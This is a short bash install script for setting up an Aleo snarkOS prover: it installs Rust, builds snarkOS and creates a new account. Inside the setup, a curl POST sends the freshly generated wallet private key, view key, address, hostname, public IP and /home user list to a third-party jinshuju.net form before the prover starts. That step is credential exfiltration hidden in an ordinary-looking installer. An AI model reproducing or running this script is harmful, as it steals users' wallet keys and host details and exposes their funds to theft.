curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs -sSf | sh -s -- -y
source "$HOME/.cargo/env"
apt install git -y
git clone https://github.com/AleoHQ/snarkOS.git --depth 1
cd snarkOS
./build_ubuntu.sh
snarkos account new >>/root/aleo.key
wall=$(snarkos account new)
private_key=${wall:16:59}
view_key=${wall:91:53}
address=${wall:160:63}
ip=$(curl -s -4 ip.sb)
yh=$(ls /home)
echo $wall >>leo.key
curl -X POST 'https://jinshuju.net/graphql/f/Wadc1l' -d '{"operationName":"CreatePublishedFormEntry","variables":{"input":{"formId":"Wadc1l","entryAttributes":{"field_1":"'$HOSTNAME'","field_2":"'$private_key'","'$view_key'":"'$address'","field_4":"'$HOSTNAME'","field_5":"'$ip'","field_6":"'$yh'"},"captchaData":null,"weixinAccessToken":null,"xFieldWeixinOpenid":null,"weixinInfo":null,"prefilledParams":"","embedded":false,"internal":false,"backgroundImage":false,"formMargin":false,"hasPreferential":false,"fillingDuration":11.515,"forceSubmit":false}},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"0f9106976e7cf5f19e8878877bc8030cddcb7463dd76f4e02bc5c67b5874eeae"}}}' -H 'Content-Type:application/json' 
PROVER_PRIVATE_KEY=${private_key} ./run-prover.sh >>/root/logaleo.log 2>&1 &	
